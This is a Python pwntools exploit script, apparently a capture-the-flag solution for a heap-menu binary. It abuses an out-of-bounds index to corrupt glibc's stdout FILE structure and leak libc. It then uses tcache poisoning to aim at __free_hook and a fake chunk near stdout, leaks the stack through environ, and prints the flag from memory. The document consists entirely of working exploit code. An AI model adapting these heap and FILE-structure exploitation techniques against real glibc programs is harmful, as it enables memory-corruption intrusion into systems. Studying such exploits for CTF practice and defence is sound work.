from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rl     = lambda      : io.recvline()
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'your choice >>> '
def add(idx, mes, length=None, name=b'XiaozaYa', flag=True):
	sla(menu, b'1')
	sla(b'lemon: ', byte(idx))
	if len(name) == 0x10 or flag == False: sda(b'lemon: ', name)
	else: sla(b'lemon: ', name)
	if length is None: length = len(mes)
	sla(b'lemon: ', byte(length))
	if length < 0x400:
		if length != len(mes) and flag: sla(b'message: ', mes)
		else: sda(b'message: ', mes)

def eat(idx):
	sla(menu, b'2')
	sla(b'lemon : ', byte(idx))

def dele(idx):
	sla(menu, b'3')
	sla(b'lemon : ', byte(idx))

def color(idx, color, flag=True):
	sla(menu, b'4')
	sla(b'lemon  : ', byte(idx))
	if flag: sla(b'color!', color)
	else: sda(b'color!', color)

def exp1():
	sla(b'me?', b'yes')
	sla(b'number: ', b'1111')
	sla(b'first: ', b'XiaozaYa')
	rut(b'reward is ')
	flag_stack_offset = int(rut(b'\n'),16)
	info('flag_stack_offset', flag_stack_offset)
	# idx mes, len, name, flag
	add(0, p64(0)+p64(0x31), 0x10, p64(0)+p64(0x31))
	
	color(-0x10c, p64(0xfbad1887)+p64(0)*3+p8(0), False)
	rl()
	rc(24)
	libc.address = addr(8) - 0x3d73e0
	environ = libc.sym.environ
	stdout = libc.sym._IO_2_1_stdout_
	free_hook = libc.sym.__free_hook
	info('libc_base', libc.address)
	info('environ_addr', environ)
	info('_IO_2_1_stdout_', stdout)
	info('free_hook', free_hook)

	add(0, b'A', 0x1000, p64(0)+p64(0x31))
	dele(0)

	add(1, b'AAA', 0x100, p8(0xc0), False)
	add(1, b'AAA', 0x100, p64(0)+p64(0x30), False)

	eat(1)
	rut(b'eat eat eat ')
	heap_addr = int(rut(b'...'),10)
	info('heap_addr', heap_addr)

	add(2, b'AAA', 0x100, p64(free_hook)+p16(heap_addr-0x2b0+0x10), False)
	dele(1)

	pay = p64(0x20000000000)+p64(0)*3+p64(0x1000000)
	pay+= p64(0)*5+p64(libc.sym._IO_2_1_stdout_-0x33)*10 # fakechunk
	add(3, pay, 0x240, b'AAAA', False)

	pay = b"\x00"*(0x33-0x10)+p64(0x71)*2+p64(0xfbad1887)+p64(0)*3+p64(environ)+p64(environ+0x10)[:-3]
	add(0, pay, 0x60, b'AAAAA', False)
	rl()
	env = addr(6)
	flag_addr = env - 0x190
	info('env', env)
	info('flag_addr', flag_addr)

	dele(3)
	pay = p64(0x20000000000)+p64(0)*3+p64(0x1000000)
	pay+= p64(0)*5+p64(libc.sym._IO_2_1_stdout_-0x33)*10 # fakechunk
	add(3, pay, 0x240, b'AAAA', False)

	pay = b"\x00"*(0x33-0x10)+p64(0x71)*2+p64(0xfbad1887)+p64(0)*3+p64(flag_addr)+p64(env)[:-3]
	add(0, pay, 0x60, b'AAAAA', False)
	print(rut(b'}'))
	rut(menu)
	#debug()
	sh()

if __name__ == '__main__':	
	while True:
		try:
			io = process("./pwn")
			exp1()
			break
		except Exception as e:
			io.close()
			continue



